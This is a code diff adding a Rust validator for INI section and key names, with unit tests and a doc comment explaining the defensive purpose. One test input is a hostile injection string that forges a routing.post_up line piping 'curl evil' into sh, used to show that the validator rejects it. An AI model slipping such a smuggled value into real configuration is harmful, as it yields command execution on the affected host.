@@ -32,6 +32,28 @@ pub fn is_valid_gateway(s: &str) -> bool {
     !s.starts_with('-') && s.parse::<std::net::IpAddr>().is_ok()
 }
 
+/// Validate a name used as INI *structure*: a section instance
+/// (`[profile:<name>]`, `[user:<name>]`, `[group:<name>]`) or the dynamic tail of
+/// a key (`metadata.<key>`).
+///
+/// SECURITY: unlike values, section headers and keys are serialized bare, and the
+/// INI grammar is line-oriented with no continuations. A control character in a
+/// name therefore splits the line and forges extra `[section]` / `key = value`
+/// lines when the file is read back — the route by which a panel-supplied profile
+/// name could smuggle a `routing.post_up` hook (run through `/bin/sh -c` on the
+/// next start) past the API guard that deliberately keeps hooks file-only.
+/// Leading/trailing whitespace is rejected too: the parser trims, so such a name
+/// would silently return renamed.
+///
+/// This deliberately rejects only what is structurally unsafe rather than
+/// allowlisting a charset — names like `user@example.com` stay valid, so existing
+/// deployments keep saving. `config/format.rs` strips control characters at
+/// serialize time as a fail-closed backstop; this check exists so the operator
+/// gets a clear error instead of a silently mangled name.
+pub fn is_valid_ident(s: &str) -> bool {
+    !s.is_empty() && s.len() <= 128 && !s.chars().any(|c| c.is_control()) && s.trim() == s
+}
+
 #[cfg(test)]
 mod route_validate_tests {
     use super::{is_valid_cidr, is_valid_gateway};
@@ -58,6 +80,38 @@ mod route_validate_tests {
         // the exact mistake that produced an empty cidr: a subnet in `gateway=`
         assert!(!is_valid_gateway("172.16.20.0/24"));
         assert!(!is_valid_gateway(""));
+    }
+
+    #[test]
+    fn ident_accepts_realistic_names() {
+        // Must not regress existing deployments: plain names, dots/underscores/
+        // hyphens and email-style usernames all stay valid.
+        for ok in [
+            "tcp",
+            "udp-quic",
+            "profile.one",
+            "user_2",
+            "user@example.com",
+            "Группа",
+        ] {
+            assert!(super::is_valid_ident(ok), "{ok:?} must be a valid name");
+        }
+    }
+
+    #[test]
+    fn ident_rejects_ini_injection_and_silent_renames() {
+        // SECURITY: the newline is the actual injection vector — it forges a
+        // `routing.post_up` line (command execution) out of a profile NAME.
+        assert!(!super::is_valid_ident(
+            "tcp]\nrouting.post_up = curl evil|sh\n[profile:junk"
+        ));
+        assert!(!super::is_valid_ident("a\rb"));
+        assert!(!super::is_valid_ident("a\u{0}b"));
+        // The parser trims, so edge whitespace would come back silently renamed.
+        assert!(!super::is_valid_ident(" tcp"));
+        assert!(!super::is_valid_ident("tcp "));
+        assert!(!super::is_valid_ident(""));
+        assert!(!super::is_valid_ident(&"x".repeat(129)));
     }
 }
 
